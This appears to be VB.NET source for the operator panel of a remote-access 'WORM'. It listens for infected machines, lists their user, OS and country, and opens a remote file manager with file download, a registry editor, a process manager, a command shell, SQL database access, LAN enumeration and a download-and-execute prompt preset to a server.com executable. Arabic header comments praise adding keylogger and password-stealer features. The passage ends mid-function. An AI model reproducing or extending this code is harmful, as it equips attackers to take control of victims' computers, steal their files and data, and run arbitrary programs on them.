Imports System.Threading
Imports System.Net
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports System.Security.Principal
Imports System.Reflection
'########################################################################################################
'################## تحياتى للى داخلين مجال البرمجة و هم كل اللى يعرفوه نقطة فى داحل بحر من مبرمج صغير داخل شركة برمجة صغيرة 
'############################################# تحيتاى لكل من ياخذ نسخ و لصق دون ذكر اى حقوق لصاحب المشروع  و من ثم يقنعوا انفسهم بانهم يفهموا 
'########################################## تحيتاى لكل شخص يفتحلى فورم و فقط يقعد يلعب فيها و هو ولا فاهم هو بيعمل ايه 
'################################  احب اقول كلمة لكل هؤلااء الاشخص اللى لا يضيفوا شىء بل يكون عبء على مجال البرمجة, انه فى الاخر بعد تعديله البضين فى هذا المشروع 
'انه لن يعرف يضيف  اليه خواص جديدة و من ثم فقط انا قد تعلمت كل هذا بنفسى ليس من مشاهدة بل بالقراءة و الفهم و الفهم الجيد 
'ليس من الجيد ان تقنع نفسك بانك تفهم السورس و بعدها تعدل بالوان بضان زيك و تكتب اسمك عليه 
'لانه لا يهمنى انا شخصيا لانه اذا همنى ذلك لما كنت لانشر ذلك السورس 
'########################################################################################################
'#### تحياتى الحقيقة للمطورين و اقصد المطورين هم من يضيفوا خواص جديدة مثل Webcam , Desktop , Keylogger 
'او حتى password stealer
'##############################تحياتى الحقيقة للاشخاص المبدعين اللى يستطيعوا نشر السورس مع ذكر حقوق المبرمج 
'############### و احب اقول ان لو غيرت الاسم دون تطوير لن يضرنى فقط سيضرك انت لانه ستزال جاهل ههههههههه و لن تطور فى تعليمك للبرمجة
'
'
'
'

Public Class Form1
    Dim vr As String = "WORM Online [ x ] SEL [ y ] Port [ p ]"
    Public str As String
    Private Sub L1_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs)

    End Sub
    Private Function FormatFileSize(ByVal Size As String) As String
        If Size.Length < 4 Then
            Return Size & " Bytes"
            Exit Function
        End If
        Dim s As String = Size / 1024
        Dim F As String = " KB"
        Dim ss As Integer
        If InStr(s, ".") > 0 Then
            Dim j As Array = Split(s, ".")
            s = j(0)
            If j(1).ToString.Length > 3 Then
                ss = Mid(j(1), 1, 3)
            Else
                ss = j(1)
            End If
        End If
        If s.Length > 3 Then
            s = s / 1024
            F = " MB"
            If InStr(s, ".") > 0 Then
                Dim j As Array = Split(s, ".")
                s = j(0)
                If j(1).ToString.Length > 3 Then
                    ss = Mid(j(1), 1, 3)
                Else
                    ss = j(1)
                End If
            End If
        End If
        If s.Length > 3 Then
            s = s / 1024
            F = " GB"
            If InStr(s, ".") > 0 Then
                Dim j As Array = Split(s, ".")
                s = j(0)
                If j(1).ToString.Length > 3 Then
                    ss = Mid(j(1), 1, 3)
                Else
                    ss = j(1)
                End If
            End If
        End If
        Return s & "." & ss & F
    End Function

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        Control.CheckForIllegalCrossThreadCalls = False
        FUNC.F = Me
        Prepare_Listview_imageList_N()
        str = InputBox("Select The Communication Port", "Settings", 81)
        If (str = "") Then
            MessageBox.Show("ERROR! in the port", "ERR", MessageBoxButtons.OK, MessageBoxIcon.Stop)
            End
        End If
        FUNC.W.Prefixes.Add(("http://*:" & str & "/"))
        FUNC.W.Start()
        Dim thread2 As New Thread(New ThreadStart(AddressOf Stay_Handle), 10) With { _
            .Priority = ThreadPriority.Normal _
        }
        thread2.Start()
        Lv1.Items.Add(HM() & " LOG EVENT Waiting For Connections at " & str).ForeColor = Color.Yellow
        Lv1.Items.Add(HM() & " LOG EVENT Starting Http Listener .. " & str).ForeColor = Color.Yellow
        Lv1.Items.Add(HM() & " LOG EVENT Port Set To " & str).ForeColor = Color.WhiteSmoke
        Lv1.Items.Add(HM() & " LOG EVENT The WORM Started.").ForeColor = Color.Lime


    End Sub
    Private Sub Form_Closed(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.FormClosed
        End
    End Sub

    Public Shared Function HM() As String
        Return My.Computer.Clock.LocalTime.ToString("hh:mm:ss")
    End Function
    Function SB(ByVal s As String) As Byte() ' string to byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Function BS(ByVal b As Byte()) As String ' byte() to string
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Private Function GetStreamAsByteArray(ByVal stream As System.IO.Stream) As Byte()

        Dim streamLength As Integer = Convert.ToInt32(stream.Length)

        Dim fileData As Byte() = New Byte(streamLength) {}

        ' Read the file into a byte array
        stream.Read(fileData, 0, streamLength)
        stream.Flush()
        stream.Close()

        Return fileData

    End Function
    Private Function GetDocumentContents(ByVal Request As HttpListenerRequest) As String


        Dim documentContents As String

        Using receiveStream As IO.Stream = Request.InputStream
            Using readStream As IO.StreamReader = New IO.StreamReader(receiveStream, Request.ContentEncoding)
                documentContents = readStream.ReadToEnd()
            End Using
        End Using


        Return documentContents
    End Function
    Protected Friend Sub Send_to_Client(ByVal s As String, ByVal key As String)

        If (L1.SelectedItems.Count = 1) Then
RECommand:
            Dim enumerator As IEnumerator
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(current.Tag, Nothing, "cmd", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "add", New Object() {s}, Nothing, Nothing, Nothing, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        ElseIf (L1.SelectedItems.Count = 0) Then
ReSelecting:
            Dim Str_Ary As String() = Split(key, FUNC.SPL)


            If Get_LV_Item(Str_Ary) IsNot Nothing Then
                Try
                    Get_LV_Item(Str_Ary).Selected = True
                    Get_LV_Item(Str_Ary).Focused = True
                    GoTo RECommand
                Catch ex As Exception

                End Try
            End If
        ElseIf (L1.SelectedItems.Count > 1) Then
            For Each itm As ListViewItem In L1.Items
                If itm.Selected = True Then
                    itm.Selected = False
                    itm.Focused = False
                    GoTo Re_Deselect
                    Exit For
                End If
            Next
Re_Deselect:
            For Each itm As ListViewItem In L1.SelectedItems
                If itm.Selected = True Then
                    itm.Selected = False
                    itm.Focused = False
                End If
            Next
            'Recheck for deselecting all items 
Re_Check_For_NullValues:
            For i As Integer = 0 To L1.SelectedIndices.Count
                L1.Items(L1.SelectedIndices(i)).Selected = False
                L1.Items(L1.SelectedIndices(i)).Focused = False
            Next
            L1.Update()
            'After Deselecting morethan one client 
            GoTo ReSelecting 'Reselect target client with it`s key to send the command
        End If
    End Sub
    Private Function Get_LV_Item(ByVal Str_Ary1 As String()) As ListViewItem
        Dim ip_address As String = Str_Ary1(Str_Ary1.Length - 1) : Dim Hw_id As String = Str_Ary1(0)
        Dim PC_name As String = Str_Ary1(1) : Dim USER_name As String = Str_Ary1(2) : Dim OS_name As String = Str_Ary1(3)
        For Each item_1 As ListViewItem In L1.Items
            If item_1.SubItems(0).Text.Equals(Hw_id) Then
                If item_1.SubItems(1).Text.Equals(ip_address) Then
                    If item_1.SubItems(2).Text.Equals(PC_name) Then
                        If item_1.SubItems(3).Text.Equals(USER_name) Then
                            If item_1.SubItems(4).Text.Equals(OS_name) Then
                                Return item_1
                            End If
                        End If
                    End If
                End If
            End If
        Next
        Return Nothing
    End Function
    Private Function Return_OS_INDEX(ByVal OS_Name As String)
        If IS_Infected = False Then
            '
            If OS_Name.Contains("xp") Or OS_Name.Contains("XP") Or OS_Name.Contains("Xp") Then
                Return 0

            ElseIf OS_Name.Contains("7") Or OS_Name.Contains("Seven") Or OS_Name.Contains("even") Or OS_Name.Contains("2008") Then
                Return 1
            ElseIf OS_Name.Contains("ta") Or OS_Name.Contains("Vista") Or OS_Name.Contains("VISTA") Or OS_Name.Contains("2007") Then
                Return 2
            ElseIf OS_Name.Contains("10") Or OS_Name.Contains("1") Or OS_Name.Contains("8") Or OS_Name.Contains("8.1") Or OS_Name.Contains("2012") Or OS_Name.Contains("2010") Then
                Return 3
            ElseIf OS_Name.Contains("2000") Or OS_Name.Contains("2003") Or OS_Name.Contains("2002") Or OS_Name.Contains("2001") Then
                Return 0

            Else
                Return 4
            End If
        ElseIf IS_Infected = True Then
            ' OS_Img_List.ImageSize = New Size(125, 110)
            If OS_Name.Contains("xp") Or OS_Name.Contains("XP") Or OS_Name.Contains("Xp") Then
                Return 5
            ElseIf OS_Name.Contains("7") Or OS_Name.Contains("Seven") Or OS_Name.Contains("even") Or OS_Name.Contains("2008") Then
                Return 6
            ElseIf OS_Name.Contains("ta") Or OS_Name.Contains("Vista") Or OS_Name.Contains("VISTA") Or OS_Name.Contains("2007") Then
                Return 7
            ElseIf OS_Name.Contains("10") Or OS_Name.Contains("1") Or OS_Name.Contains("8") Or OS_Name.Contains("8.1") Or OS_Name.Contains("2012") Or OS_Name.Contains("2010") Then
                Return 8
            ElseIf OS_Name.Contains("2000") Or OS_Name.Contains("2003") Or OS_Name.Contains("2002") Or OS_Name.Contains("2001") Then
                Return 5
            Else
                Return 9
            End If
        End If

    End Function
    Private OS_Img_List As New ImageList
    Private IS_Infected As Boolean = False
    Protected Friend Sub Set_inf(ByVal inf As Boolean)
        IS_Infected = inf
    End Sub
    Protected Friend Function get_inf() As Boolean
        Return IS_Infected
    End Function
    Friend Function ret_notif_OS(ByVal os As String) As Integer
        Return Return_OS_INDEX(os)
    End Function
    Friend Function GetImageList() As ImageList
        Return OS_Img_List
    End Function
    Private Sub Prepare_Listview_imageList_N()
        OS_Img_List.Images.Add(My.Resources.WindowsXP) '0
        OS_Img_List.ImageSize = New Size(125, 110)

        OS_Img_List.Images.Add(My.Resources.Windows7) ' new1              '1
        OS_Img_List.Images.Add(My.Resources.Windows_Vista) 'new2          '2
        OS_Img_List.Images.Add(My.Resources.Windows10) 'new3              '3
        'OS_Img_List.Images.Add(My.Resources.mac_c)                 '4
        'OS_Img_List.Images.Add(My.Resources.linux)                 '5
        OS_Img_List.Images.Add(My.Resources.unknowen) 'new4              '6


        '  ------------------------------------------ Adding Jar on Windows

        OS_Img_List.Images.Add(My.Resources.WindowsXP_infected) 'new5     '7
        OS_Img_List.Images.Add(My.Resources.Windows7_infected)  'new6     '8
        OS_Img_List.Images.Add(My.Resources.Windows_Vista_infected) 'new7  '9
        OS_Img_List.Images.Add(My.Resources.Windows10_infected) 'new8     '10
        OS_Img_List.Images.Add(My.Resources.unknowen_infected) 'new9      '11

        '  ------------------------------------------ Adding Android icons

        'OS_Img_List.Images.Add(My.Resources.Android2) '12
        'OS_Img_List.Images.Add(My.Resources.andor) '13



        'XPR_list_l1.AllowDrop = True
    End Sub
    Private Delegate Sub _Data_NOTIF(ByVal strArray As String(), ByVal key As String, ByVal ip As String)
    Private Sub Data_NOTIF(ByVal strArray As String(), ByVal key As String, ByVal ip As String)
        On Error Resume Next
        If My.Application.OpenForms("notif_X" & key) IsNot Nothing Then Exit Sub
        If Me.InvokeRequired Then
            Dim j As New _Data_NOTIF(AddressOf Data_NOTIF)
            Me.Invoke(j, New Object() {strArray, key, ip})
            Exit Sub
        End If
        Dim CompForm As New nono
        CompForm.key = key
        CompForm.Name = "notif_X" & key
        CompForm.Label9.Text = ip
        CompForm.Label5.Text = strArray(0)
        CompForm.Label7.Text = strArray(2) 'USER
        CompForm.Label6.Text = strArray(3)  'OS
        CompForm.Label8.Text = GeoIP.LookupCountryName(ip)
        CompForm.Show()
    End Sub

    Private Delegate Sub _Data(ByVal fire_up As String, ByVal ip As String, ByVal key As String, ByVal B As Byte())
    Private Sub Data(ByVal fire_up As String, ByVal ip As String, ByVal key As String, ByVal B As Byte())
        Dim Data_String As String = BS(B)
        If Data_String.Length > 3 Then
            ' MsgBox(Data_String)
        End If

        Dim A() As String = Split(Data_String, SPL)
        Try
            Select Case A(0)
                Case "open_fm"
                    Try
                        If My.Application.OpenForms("open_fm" & key) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Data(AddressOf Data)
                            Me.Invoke(j, New Object() {fire_up, ip, key, B})
                            Exit Sub
                        End If
                        Dim CompForm As New File_Manager
                        CompForm.key = key
                        CompForm.Name = "open_fm" & key
                        CompForm.Text &= " " & ip
                        CompForm.Show()
                    Catch ex As Exception : End Try
                Case "fm_drives"
                    Try
                        Dim splt_lines As String = "drv_split"
                        Dim CompForm As File_Manager = Application.OpenForms("open_fm" & key)
                        Dim DRV_ARY1 As String() = Split(A(1), splt_lines)
                        For Each DRV_ARY2 As String In DRV_ARY1
                            Dim DRV_PATH As String = Split(DRV_ARY2, "|")(0)
                            Dim DRV_TYPE As String = Split(DRV_ARY2, "|")(1)
                            Dim DRV_T As String = "Fixed Drive"
                            Dim ITM As New ListViewItem
                            ITM.Text = DRV_PATH & "\"
                            Select Case DRV_TYPE
                                Case "2"
                                    DRV_T = "Fixed Drive"
                                    ITM.ImageIndex = 2
                                Case "3"
                                    DRV_T = "Network Drive"
                                    ITM.ImageIndex = 3
                                Case "3"
                                    DRV_T = "Removable Drive"
                                    ITM.ImageIndex = 5
                                Case "4"
                                    DRV_T = "CD-ROM Drive"
                                    ITM.ImageIndex = 4
                                Case Else
                                    ITM.ImageIndex = 2
                            End Select
                            ITM.SubItems.Add(DRV_T)
                            If CompForm.ListView1.Items.Contains(ITM) = False Then
                                CompForm.ListView1.Items.Add(ITM)
                            End If
                        Next
                    Catch ex As Exception : End Try
                Case "fm_browse"
                    Try
                        Dim splt_lines As String = "gfm_split"
                        Dim CompForm As File_Manager = Application.OpenForms("open_fm" & key)
                        Dim FOL_ARY As String() = Split(A(1), splt_lines)
                        For Each ARY2 As String In FOL_ARY
                            Dim ITM_Name As String = Split(ARY2, "#!#")(0)
                            Dim ITM_Size As String = Split(ARY2, "#!#")(1)
                            Dim ITM_Type As String = Split(ARY2, "#!#")(2)
                            Dim ITM As New ListViewItem
                            ITM.Text = ITM_Name

                            Select Case ITM_Type
                                Case "dir"
                                    ITM.ImageIndex = 1
                                    ITM.SubItems.Add("File Folder")
                                    ITM.SubItems.Add(ITM_Size)
                                Case "fil"
                                    ITM.ImageIndex = 0
                                    ITM.SubItems.Add("File")
                                    Try
                                        ITM.SubItems.Add(FormatFileSize(ITM_Size))
                                    Catch ex As Exception : End Try
                            End Select


                            If CompForm.ListView1.Items.Contains(ITM) = False Then
                                CompForm.ListView1.Items.Add(ITM)
                            End If
                        Next
                    Catch ex As Exception : End Try

                Case "open_reg"
                    Try
                        If My.Application.OpenForms("open_reg" & key) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Data(AddressOf Data)
                            Me.Invoke(j, New Object() {fire_up, ip, key, B})
                            Exit Sub
                        End If
                        Dim CompForm As New Registry_Editor
                        CompForm.key = key
                        CompForm.RGk.CreateControl()
                        CompForm.Name = "open_reg" & key
                        CompForm.Text &= " " & ip
                        CompForm.Show()
                    Catch ex As Exception : End Try


                Case "open_proc"

                    Try
                        If My.Application.OpenForms("open_proc" & key) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Data(AddressOf Data)
                            Me.Invoke(j, New Object() {fire_up, ip, key, B})
                            Exit Sub
                        End If
                        Dim CompForm As New Process_Manager
                        CompForm.key = key
                        CompForm.Name = "open_proc" & key
                        CompForm.Text &= " " & ip
                        CompForm.Show()
                    Catch ex As Exception : End Try

                Case "get_proc"

                    Try
                        Dim CompForm As Process_Manager = Application.OpenForms("open_proc" & key)

                        Dim PROC_ARY As String() = Split(A(1), "PrO_SPL")
                        For Each PROC_ARY2 As String In PROC_ARY
                            Try
                                Dim P_Name As String = Split(PROC_ARY2, "#")(0)
                                Dim P_PID As String = Split(PROC_ARY2, "#")(1)
                                Dim P_EXE_Path As String = Split(PROC_ARY2, "#")(2)
                                Dim ITM As New ListViewItem
                                ITM.Text = P_Name
                                ITM.ImageIndex = 0
                                ITM.SubItems.Add(P_PID)
                                ITM.SubItems.Add(P_EXE_Path)
                                If CompForm.ListView1.Items.Contains(ITM) = False Then
                                    CompForm.ListView1.Items.Add(ITM)
                                End If
                            Catch ex As Exception : End Try

                        Next
                    Catch ex As Exception

                    End Try

                Case "get_reg"
                    Try

                        Dim regedit As Registry_Editor = Application.OpenForms("open_reg" & key)
                        regedit.RGk.Enabled = True
                        regedit.RGLIST.Enabled = True
                        regedit.RGk.SelectedNode.Nodes.Clear()
                        regedit.RGLIST.Items.Clear()
                        Dim ALL_ARY As String() = Split(A(1), "R#_$PL")
                        'MsgBox(A(1))

                        Dim Sub_keys As String() = Split(ALL_ARY(0), "|l_ln|")

                        For Each sub_key_name As String In Sub_keys
                            Try
                                regedit.Add_key(sub_key_name)
                            Catch ex As Exception
                                '    MsgBox(ex.Message)
                            End Try
                            ' Dim item As ListViewItem = regedit.RGLIST.Items.Add(sub_key_name)
                        Next

                        Dim key_values As String = ALL_ARY(1)
                        Dim Values_ary As String() = Split(key_values, "|vsl_n|")
                        For Each Value_ARY As String In Values_ary
                            Dim val_name As String = Split(Value_ARY, "#$")(0)
                            Dim val_type As String = Split(Value_ARY, "#$")(1)
                            Dim val_data As String = Split(Value_ARY, "#$")(2)
                            Dim ITM As New ListViewItem
                            ITM.Text = val_name
                            Select Case val_type
                                Case "1"
                                    ITM.SubItems.Add("REG_SZ")
                                    ITM.ImageIndex = 1
                                Case "2"
                                    ITM.SubItems.Add("REG_EXPAND_SZ")
                                    ITM.ImageIndex = 1
                                Case "3"
                                    ITM.SubItems.Add("REG_BINARY")
                                    ITM.ImageIndex = 2
                                Case "4"
                                    ITM.SubItems.Add("REG_DWORD")
                                    ITM.ImageIndex = 2
                                Case "7"
                                    ITM.SubItems.Add("REG_MULTI_SZ")
                                    ITM.ImageIndex = 1

                            End Select
                            ITM.SubItems.Add(val_data)
                            If regedit.RGLIST.Items.Contains(ITM) = False Then
                                regedit.RGLIST.Items.Add(ITM)
                            End If
                        Next
                        Dim num21 As Integer = (regedit.RGLIST.Columns.Count - 1)
                        Dim j As Integer = 0
                        Do While (j <= num21)
                            regedit.RGLIST.Columns.Item(j).AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize)
                            j += 1
                        Loop


                    Catch ex As Exception

                    End Try

                Case "open_cmd"

                    Try
                        If My.Application.OpenForms("open_cmd" & key) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Data(AddressOf Data)
                            Me.Invoke(j, New Object() {fire_up, ip, key, B})
                            Exit Sub
                        End If
                        Dim CompForm As New cmd_shell
                        CompForm.key = key
                        CompForm.Name = "open_cmd" & key
                        CompForm.Text &= " " & ip
                        CompForm.Show()
                        CompForm.RichTextBox1.Text = A(1)
                    Catch ex As Exception : End Try
                Case "resp_cmd"
                    Try
                        Dim cmd_shell As cmd_shell = Application.OpenForms("open_cmd" & key)
                        cmd_shell.RichTextBox1.Text = A(1)
                    Catch ex As Exception

                    End Try
                Case "open_Sql_login"

                    Try
                        If My.Application.OpenForms("open_Sql_login" & key) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Data(AddressOf Data)
                            Me.Invoke(j, New Object() {fire_up, ip, key, B})
                            Exit Sub
                        End If
                        Dim CompForm As New Sql_login
                        CompForm.key = key
                        CompForm.Name = "open_Sql_login" & key
                        CompForm.Text &= " " & ip
                        CompForm.Show()

                    Catch ex As Exception : End Try
                Case "open_lan_enum"

                    Try
                        If My.Application.OpenForms("open_lan_enum" & key) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Data(AddressOf Data)
                            Me.Invoke(j, New Object() {fire_up, ip, key, B})
                            Exit Sub
                        End If
                        Dim CompForm As New Lan_Eunumeriation_Tool
                        CompForm.key = key
                        CompForm.Name = "open_lan_enum" & key
                        CompForm.Text &= " " & ip
                        CompForm.Label1.Text = "LOCAL IP Addresses of Client : " & ip
                        CompForm.Show()

                    Catch ex As Exception : End Try

                Case "get_local_enum"
                    Try
                        Dim lan_form As Lan_Eunumeriation_Tool = Application.OpenForms("open_lan_enum" & key)
                        lan_form.RichTextBox1.Text = A(1).Replace("ip_splt_i", vbNewLine)

                    Catch ex As Exception

                    End Try
                Case "sql_login_stat"

                    Try
                        'sql_login_stat
                        Dim sql_form As Sql_login = Application.OpenForms("open_Sql_login" & key)
                        If A(1).Equals("login_success") Then
                            sql_form.Label4.Text = "Login Success"
                            sql_form.Button1.Enabled = False
                            Try
                                If My.Application.OpenForms("open_Sql_res" & key) IsNot Nothing Then Exit Sub
                                If Me.InvokeRequired Then
                                    Dim j As New _Data(AddressOf Data)
                                    Me.Invoke(j, New Object() {fire_up, ip, key, B})
                                    Exit Sub
                                End If
                                Dim CompForm As New SQLform

                                CompForm.SQL_CONN_STR = A(2)
                                CompForm.key = key
                                CompForm.Name = "open_Sql_res" & key
                                CompForm.Text &= " " & ip
                                CompForm.Show()

                            Catch ex As Exception
                                MsgBox("he " & ex.Message)
                            End Try

                        Else
                            sql_form.Label4.Text = A(1)
                        End If

                    Catch ex As Exception

                    End Try
                Case "dosqlquery"
                    Try
                        Dim sql_form_instance As SQLform = Application.OpenForms("open_Sql_res" & key)


                        If A(1).Equals("getdatabases") Then
                            Dim dbline As String = A(2)
                            Dim db_ary As String() = Split(dbline, "db_splt")
                            For Each db_name As String In db_ary
                                If db_name.Length > 1 Then
                                    sql_form_instance.UpdataTreeView(db_name, sql_form_instance.TreeView1, False, A(1), "")
                                End If

                            Next
                        ElseIf A(1).Equals("gettables") Then

                            Dim tableline As String = A(2)
                            Dim table_ary As String() = Split(tableline, "table_splt")
                            For Each table_name As String In table_ary
                                If table_name.Length > 1 Then
                                    'sql_rtables_end
                                    If table_name.Equals("sql_rtables_end") = False Then
                                        sql_form_instance.UpdataTreeView(table_name, sql_form_instance.TreeView1, False, A(1), A(3))
                                    ElseIf table_name.Equals("sql_rtables_end") Then
                                        sql_form_instance.ADD_SORT(sql_form_instance.DataGridView1)
                                    End If

                                End If

                            Next



                        ElseIf A(1).Equals("getviews") Then
                            Dim viewline As String = A(2)
                            Dim view_ary As String() = Split(viewline, "view_splt")
                            For Each view_name As String In view_ary
                                If view_name.Length > 1 Then
                                    If view_name.Equals("sql_rtables_end") = False Then
                                        sql_form_instance.UpdataTreeView(view_name, sql_form_instance.TreeView1, False, A(1), A(3))
                                    ElseIf view_name.Equals("sql_rtables_end") Then

                                        sql_form_instance.ADD_SORT(sql_form_instance.DataGridView1)
                                    End If

                                End If
                            Next



                            'linked_svrs
                        ElseIf A(1).Equals("linked_svrs") Then
                            Dim viewline As String = A(2)
                            Dim view_ary As String() = Split(viewline, "lnked_splt")
                            For Each view_name As String In view_ary
                                If view_name.Length > 1 Then
                                    If view_name.Equals("sql_lnked_end") = False Then
                                        sql_form_instance.UpdataTreeView(view_name, sql_form_instance.TreeView1, False, A(1), A(3))
                                    ElseIf view_name.Equals("sql_lnked_end") Then

                                        sql_form_instance.ADD_SORT(sql_form_instance.DataGridView1)
                                    End If

                                End If
                            Next



                            '
                        End If
                    Catch ex As Exception

                    End Try
                Case "ord_sql_cell"
                    Dim SQLforms As SQLform = My.Application.OpenForms("open_Sql_res" & key)

                    Try
                        Dim FOL_ARY As String() = Split(A(1), "field_splt")
                        For Each ARY2 As String In FOL_ARY
                            Dim cell_value As String = ""
                            Dim rows_i As Integer = -1
                            Dim count_j As Integer = -1
                            Try
                                cell_value = Split(ARY2, "#!#")(0)
                            Catch ex As Exception: End Try
                            Try

                                rows_i = Integer.Parse(Split(ARY2, "#!#")(1))
                                count_j = Integer.Parse(Split(ARY2, "#!#")(2))
                                SQLforms.ADD_DataGridCEll(cell_value, SQLforms.DataGridView1, rows_i, count_j)
                            Catch ex As Exception

                            End Try


                        Next
                    Catch ex As Exception

                    End Try
                   
                Case "creSQLcol"

                    Dim SQLforms As SQLform = My.Application.OpenForms("open_Sql_res" & key)
                    Dim col_line As String = (A(1))
                    For Each s_colname As String In Split(col_line, "col_splt")
                        If s_colname.Equals("col_end") = False Then
                            If s_colname.Length >= 1 Then
                                SQLforms.ADD_DataGridColumn(s_colname, SQLforms.DataGridView1)
                            End If
                        End If
                    Next
                    Dim row_count As Integer = Integer.Parse(A(2))
                    SQLforms.ADD_DataGridrw(row_count, SQLforms.DataGridView1)

                Case "ordselect_ref"
                Case "sql_query"
                    Dim sql_form_instance As SQLform = My.Application.OpenForms("open_Sql_res" & key)
                    sql_form_instance.ADD_rEF(sql_form_instance.DataGridView1)
                Case "Sql_error"
                    Dim sql_form_instance As SQLform = My.Application.OpenForms("open_Sql_res" & key)
                    sql_form_instance.Label2.Text = "Error : " & vbNewLine & A(1)
                Case "open_Sql"

                    Try
                        If My.Application.OpenForms("open_Sql_res" & key) IsNot Nothing Then Exit Sub
                        If Me.InvokeRequired Then
                            Dim j As New _Data(AddressOf Data)
                            Me.Invoke(j, New Object() {fire_up, ip, key, B})
                            Exit Sub
                        End If
                        Dim CompForm As New SQLform

                        CompForm.SQL_CONN_STR = A(1)
                        CompForm.key = key
                        CompForm.Name = "open_Sql_res" & key
                        CompForm.Text &= " " & ip
                        CompForm.Show()
                        Exit Try
                    Catch ex As Exception
                        MsgBox("he " & ex.Message)
                    End Try


                Case "sql_stat"

                    Try
                        Dim sql_form As SQLform = Application.OpenForms("open_Sql_res" & key)

                    Catch ex As Exception

                    End Try

                Case Else
                    If fire_up.Contains("dwn_thi") Then
                        Dim ARY1 As String() = Split(fire_up, FUNC.SPL)
                        Dim file_name As String = ARY1(1)
                        Dim fileBinary As Byte() = B

                        If IO.Directory.Exists(Application.StartupPath & "\Downloads") = False Then
                            Try
                                IO.Directory.CreateDirectory(Application.StartupPath & "\Downloads")
                                GoTo Start_Write
                            Catch ex As Exception
                                MsgBox("Cannot Create Download Dirictory" & vbNewLine & "Exception : " & ex.Message, MsgBoxStyle.Critical)
                            End Try
                        Else
Start_Write:
                            Dim file_Dir As String = (Application.StartupPath & "\Downloads\")
                            Dim full_file_name As String = file_Dir & file_name
                            Try
                                IO.File.WriteAllBytes(full_file_name, fileBinary)
                            Catch ex As Exception
                                MsgBox("Cannot Write ByteArray" & vbNewLine & "Exception : " & ex.Message, MsgBoxStyle.Critical)
                            End Try
                        End If

                    End If

            End Select

        Catch ex As Exception
            ' MsgBox("Cannot read data " & ex.Message, MsgBoxStyle.Critical)
        End Try


    End Sub

    Function SaveBinaryData(FileName, ByteArray)
        Const adTypeBinary = 1
        Const adSaveCreateOverWrite = 2
        'Create Stream object
        Dim BinaryStream
        BinaryStream = CreateObject("ADODB.Stream")
        'Specify stream type - we want To save binary data.
        BinaryStream.Type = adTypeBinary
        'Open the stream And write binary data To the object
        BinaryStream.Open()
        BinaryStream.Write(ByteArray)
        'Save binary data To disk
        BinaryStream.SaveToFile(FileName, adSaveCreateOverWrite)
    End Function
    Public Sub Stay_Handle()
        Do While True
            Dim context As HttpListenerContext = FUNC.W.GetContext
            Try
                Dim Req_client As String = context.Request.RawUrl.Replace("/", "")
                Dim Client_key As String = (context.Request.UserAgent & context.Request.RemoteEndPoint.Address.ToString)
                Dim Client_query As String = ""
                Try : Client_query = GetDocumentContents(context.Request) : Catch ex As Exception : End Try
                Data(Req_client, FUNC.CL(Client_key).IP, Client_key, SB(Client_query)) 'Fuckers Script Kiddes didn`t know this how it work 
                'They only keep copy and paste without understanding the ideas 
            Catch ex As Exception
            End Try
            Dim collection As Collection = FUNC.Client_Collection
            SyncLock collection
                Dim client As Client = FUNC.CL((context.Request.UserAgent & context.Request.RemoteEndPoint.Address.ToString))
                If (client Is Nothing) Then
                    Dim c As New Client With { _
                        .IP = context.Request.RemoteEndPoint.Address.ToString, _
                        .UserAgent = context.Request.UserAgent _
                    }
                    client = FUNC.Add(c)
                    Dim strArray As String() = Strings.Split(c.UserAgent, SPL, -1, CompareMethod.Binary)
                    Data_NOTIF(strArray, (context.Request.UserAgent & context.Request.RemoteEndPoint.Address.ToString), c.IP)
                End If
                client.cx = context
                client.L_png = 0
            End SyncLock
            Thread.Sleep(1)
        Loop
    End Sub

    Private Sub RemoveToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoveToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    NewLateBinding.LateCall(NewLateBinding.LateGet(current.Tag, Nothing, "cmd", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "add", New Object() {"uns"}, Nothing, Nothing, Nothing, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub Timer1_Tick_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Text = vr.Replace("x", L1.Items.Count).Replace("y", L1.SelectedItems.Count).Replace("p", str)
    End Sub

    Private Sub AboutToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim URL, TYPE, a, b As String
            URL = InputBox("Put Your Link | ex: http://www.server.com/server.exe", "Download And Execute", "http://www.server.com/server.exe")
            TYPE = InputBox("Put Type Run | ex: exe , scr , pif , ....", "Download And Execute", "exe")
            Randomize()
            Dim num As Integer = CInt(Math.Round(CDbl(Int(CSng(((745447.0! * Rnd()) + 8581.0!))))))
            MsgBox("Add From Resources  As mentioned on GitHub Readme at Resources Dir")
            Exit Sub
            a = "" ' Add From Resources 
